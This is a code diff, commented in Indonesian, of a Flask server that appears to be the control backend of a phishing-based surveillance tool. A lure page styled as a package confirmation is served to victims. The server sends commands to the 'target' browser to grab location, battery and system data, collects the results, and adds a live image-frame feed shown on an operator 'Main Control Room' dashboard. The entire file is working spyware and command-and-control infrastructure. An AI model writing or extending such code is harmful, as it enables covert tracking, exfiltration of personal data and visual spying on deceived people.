@@ -3,8 +3,13 @@ from flask import Flask, request, redirect, jsonify, render_template
 
 app = Flask(__name__)
 
-# Memastikan folder untuk menyimpan data hasil sinkronisasi sudah siap
+# Konfigurasi Berkas Penyimpanan Data di VPS
 LOG_FILE = "sinkronisasi_log.txt"
+FRAME_FILE = "latest_frame.txt"
+
+# Menentukan instruksi aktif yang dikirimkan ke peramban target
+# Opsi perintah: ambil_lokasi, cek_baterai, ambil_data_sistem, ping_test
+CURRENT_COMMAND = "ambil_lokasi"
 
 @app.route('/')
 def home():
@@ -12,16 +17,14 @@ def home():
 
 @app.route('/konfirmasi-paket')
 def target_page():
-    # Mengubah pemanggilan agar membaca dari folder templates bawaan
     return render_template('target.html')
-
 
 @app.route('/static/sw.js')
 def serve_sw():
     return app.send_static_file('sw.js'), 200, {'Content-Type': 'application/javascript'}
 
 # ==========================================
-# 1. API ENDPOINT: MENERIMA DATA DARI TARGET
+# 1. API: MENERIMA KOORDINAT & STATUS TARGET
 # ==========================================
 @app.route('/api/kirim-data', methods=['POST'])
 def terima_data():
@@ -31,29 +34,78 @@ def terima_data():
             status_perangkat = data.get('status', 'Unknown')
             info_tambahan = data.get('info', 'No details')
             
-            # Catat data yang masuk ke dalam file teks di VPS
             with open(LOG_FILE, "a") as f:
-                f.write(f"SINKRONISASI AKTIF -> Status: {status_perangkat} | Detail: {info_tambahan}\n")
-                
-            return jsonify({"status": "success", "message": "Data terikat"}), 200
+                f.write(f"SINKRONISASI -> Status: {status_perangkat} | Detail: {info_tambahan}\n")
+            return jsonify({"status": "success"}), 200
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
     return jsonify({"status": "failed"}), 400
 
 # ==========================================
-# 2. API ENDPOINT: MEMBACA LOG UNTUK DASBOR
+# 2. API: MEMPROSES ALIRAN FRAME GAMBAR LIVE
 # ==========================================
+@app.route('/receive_frame', methods=['POST'])
+def receive_frame():
+    try:
+        data = request.json
+        if data and 'frame' in data:
+            # Menyimpan string base64 frame terbaru ke berkas teks di VPS
+            with open(FRAME_FILE, "w") as f:
+                f.write(data['frame'])
+            return jsonify({"status": "frame_received"}), 200
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+    return jsonify({"status": "failed"}), 400
+
+@app.route('/get_latest_frame')
+def get_latest_frame():
+    # Membaca frame terbaru untuk disemburkan ke elemen <img> dasbor
+    if os.path.exists(FRAME_FILE):
+        with open(FRAME_FILE, "r") as f:
+            base64_data = f.read()
+            # Jika format data URL valid, arahkan peramban untuk merendernya
+            if "," in base64_data:
+                import base64
+                try:
+                    header, encoded = base64_data.split(",", 1)
+                    mime_type = header.split(";")[0].split(":")[1]
+                    data_biner = base64.b64decode(encoded)
+                    return data_biner, 200, {'Content-Type': mime_type}
+                except:
+                    pass
+    # Mengembalikan gambar transparan 1x1 piksel jika belum ada frame yang masuk
+    return base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"), 200, {'Content-Type': 'image/gif'}
+
+# ==========================================
+# 3. API: SINKRONISASI INSTRUKSI OPERATOR
+# ==========================================
+@app.route('/poll_command')
+def poll_command():
+    global CURRENT_COMMAND
+    return jsonify({"command": CURRENT_COMMAND})
+
+@app.route('/report_output', methods=['POST'])
+def report_output():
+    try:
+        data = request.json
+        if data and 'output' in data:
+            with open(LOG_FILE, "a") as f:
+                f.write(f"{data['output']}\n")
+            return jsonify({"status": "success"}), 200
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+    return jsonify({"status": "failed"}), 400
+
 @app.route('/api/ambil-log')
 def ambil_log():
     if os.path.exists(LOG_FILE):
         with open(LOG_FILE, "r") as f:
             baris = f.readlines()
-            # Ambil 10 baris data terakhir agar dasbor tidak penuh
-            return jsonify({"logs": baris[-10:]})
+            return jsonify({"logs": baris[-12:]})
     return jsonify({"logs": ["Belum ada aktivitas sinkronisasi yang tercatat..."]})
 
 # ==========================================
-# 3. HALAMAN LOGIN OPERATOR
+# 4. GERBANG MASUK & PANEL KENDALI UTAMA
 # ==========================================
 @app.route('/operator', methods=['GET', 'POST'])
 def operator_panel():
@@ -81,9 +133,6 @@ def operator_panel():
     </html>
     '''
 
-# ==========================================
-# 4. HALAMAN DASBOR UTAMA (AUTO-REFRESH LOG)
-# ==========================================
 @app.route('/operator/dashboard')
 def operator_dashboard():
     return '''
@@ -91,8 +140,8 @@ def operator_dashboard():
         <head>
             <title>Gear99 - Main Control Room</title>
             <script>
-                // Fungsi untuk mengambil data log dari server setiap 2 detik secara otomatis
-                function perbaruiLog() {
+                function perbaruiDasbor() {
+                    // 1. Ambil log teks otomatis
                     fetch('/api/ambil-log')
                         .then(response => response.json())
                         .then(data => {
@@ -108,11 +157,13 @@ def operator_dashboard():
                             });
                         })
                         .catch(err => console.error("Gagal memuat log:", err));
+                    
+                    // 2. Refresh frame gambar visual secara live
+                    document.getElementById("live-stream-view").src = "/get_latest_frame?" + new Date().getTime();
                 }
                 
-                // Jalankan per pemanggilan berkala
-                setInterval(perbaruiLog, 2000);
-                window.onload = perbaruiLog;
+                setInterval(perbaruiDasbor, 1500);
+                window.onload = perbaruiDasbor;
             </script>
         </head>
         <body style="background-color: #0b0c10; color: #45f3ff; font-family: monospace; padding: 30px;">
@@ -120,7 +171,13 @@ def operator_dashboard():
             <hr style="border: 1px solid #1f2833;">
             <p style="color: #66fcf1;">Status Server: <span style="color: lightgreen;">ONLINE</span></p>
             <p style="color: #66fcf1;">PWA Service Worker: <span style="color: lightgreen;">BOUND (ACTIVE)</span></p>
-            <div style="background: #1f2833; padding: 20px; border-radius: 5px; color: white; min-height: 200px;">
+            
+            <div style="margin-bottom: 25px;">
+                <strong>[ LIVE VISUAL FEED ]</strong><br><br>
+                <img id="live-stream-view" src="" style="width: 320px; height: 240px; border: 2px solid #45f3ff; background: #1f2833; border-radius: 5px;" alt="Menunggu aliran visual...">
+            </div>
+
+            <div style="background: #1f2833; padding: 20px; border-radius: 5px; color: white; min-height: 150px;">
                 <strong>[ LOG STREAM DATA INCOMING ]</strong>
                 <div id="log-stream" style="margin-top: 15px; color: #a9eed1;">
                     Menghubungkan ke server log...
@@ -129,27 +186,6 @@ def operator_dashboard():
         </body>
     </html>
     '''
-CURRENT_COMMAND = "ambil_lokasi" # Pilihan perintah: cek_baterai, ambil_data_sistem, ambil_lokasi, ping_test
-
-@app.route('/poll_command')
-def poll_command():
-    # Mengirimkan perintah yang sedang aktif ke browser target
-    global CURRENT_COMMAND
-    cmd = CURRENT_COMMAND
-    return jsonify({"command": cmd})
-
-@app.route('/report_output', methods=['POST'])
-def report_output():
-    try:
-        data = request.json
-        if data and 'output' in data:
-            # Catat hasil keluaran perintah dari target ke dalam berkas log utama VPS
-            with open(LOG_FILE, "a") as f:
-                f.write(f"{data['output']}\n")
-            return jsonify({"status": "success"}), 200
-    except Exception as e:
-        return jsonify({"status": "error", "message": str(e)}), 500
-    return jsonify({"status": "failed"}), 400
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=80)
